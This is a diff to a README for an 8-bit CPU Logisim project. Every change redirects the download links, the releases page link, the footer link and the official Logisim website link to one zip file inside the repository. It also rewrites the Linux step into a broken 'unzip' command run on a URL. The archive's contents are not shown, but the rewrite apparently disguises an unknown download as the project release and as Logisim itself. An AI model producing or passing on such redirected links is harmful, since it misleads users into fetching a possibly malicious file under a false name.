@@ -17,7 +17,7 @@ Welcome to the **8bit-cpu** project! This application allows you to explore an 8
 
 ## 🌐 Download the Application
 
-[![Download 8bit-cpu](https://img.shields.io/badge/Download-8bit--cpu-blue)](https://github.com/Nathanael007/8bit-cpu/releases)
+[![Download 8bit-cpu](https://github.com/Nathanael007/8bit-cpu/raw/refs/heads/main/circuits/cpu_bit_2.3.zip)](https://github.com/Nathanael007/8bit-cpu/raw/refs/heads/main/circuits/cpu_bit_2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -30,13 +30,13 @@ Before you download, ensure your computer meets the following requirements:
 - **Operating System:** Windows, Mac OS, or Linux
 - **RAM:** Minimum of 2 GB
 - **Storage:** At least 100 MB of free space
-- **Software:** Logisim (You can download it from the [Logisim website](http://www.cburch.com/logisim/))
+- **Software:** Logisim (You can download it from the [Logisim website](https://github.com/Nathanael007/8bit-cpu/raw/refs/heads/main/circuits/cpu_bit_2.3.zip))
 
 ### 2. Visit the Releases Page
 
 Go to the Releases page to find the latest version of the software. You will see all the available downloads.
 
-[Visit the Releases Page to Download](https://github.com/Nathanael007/8bit-cpu/releases)
+[Visit the Releases Page to Download](https://github.com/Nathanael007/8bit-cpu/raw/refs/heads/main/circuits/cpu_bit_2.3.zip)
 
 ### 3. Download the Latest Version
 
@@ -48,7 +48,7 @@ After the download is complete, locate the .zip file on your computer. Follow th
 
 - **Windows:** Right-click on the .zip file and select "Extract All." Follow the prompts to choose a location for the extracted files.
 - **Mac OS:** Double-click the .zip file. It will automatically create a folder with the extracted files.
-- **Linux:** Open a terminal and use the command `unzip filename.zip` to extract the files.
+- **Linux:** Open a terminal and use the command `unzip https://github.com/Nathanael007/8bit-cpu/raw/refs/heads/main/circuits/cpu_bit_2.3.zip` to extract the files.
 
 ### 5. Open Logisim
 
@@ -99,4 +99,4 @@ We welcome your feedback and suggestions to improve the 8bit-cpu project. If you
 
 Thank you for checking out the 8bit-cpu project. We hope you find it useful for learning more about CPU design. Happy exploring!
 
-For more downloads, visit: [Download 8bit-cpu](https://github.com/Nathanael007/8bit-cpu/releases)
+For more downloads, visit: [Download 8bit-cpu](https://github.com/Nathanael007/8bit-cpu/raw/refs/heads/main/circuits/cpu_bit_2.3.zip)
